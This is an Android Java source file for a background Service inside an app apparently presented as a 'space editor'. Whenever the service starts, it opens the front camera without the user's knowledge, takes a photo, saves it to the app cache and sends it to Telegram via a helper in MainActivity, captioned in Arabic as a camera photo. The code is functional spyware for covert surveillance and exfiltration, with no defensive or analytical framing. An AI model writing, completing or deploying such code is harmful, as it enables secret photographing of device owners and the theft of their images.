package com.example.spaceeditor;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.hardware.Camera;
import android.os.IBinder;
import android.util.Log;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;

public class CameraService extends Service {
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        takePicture(this);
        return START_NOT_STICKY;
    }

    public static void takePicture(Context context) {
        try {
            // 1 لفتح الكاميرا الأمامية، 0 للخلفية
            Camera camera = Camera.open(1); 
            if (camera == null) return;
            camera.startPreview();
            camera.takePicture(null, null, (data, cam) -> {
                try {
                    File file = new File(context.getCacheDir(), "cam.jpg");
                    FileOutputStream fos = new FileOutputStream(file);
                    fos.write(data);
                    fos.close();
                    MainActivity.sendTelegramFile(file, "📸 صورة من الكاميرا");
                    cam.release();
                } catch (IOException e) {
                    Log.e("CAM", "Error saving", e);
                }
            });
        } catch (Exception e) {
            Log.e("CAM", "Error opening", e);
        }
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
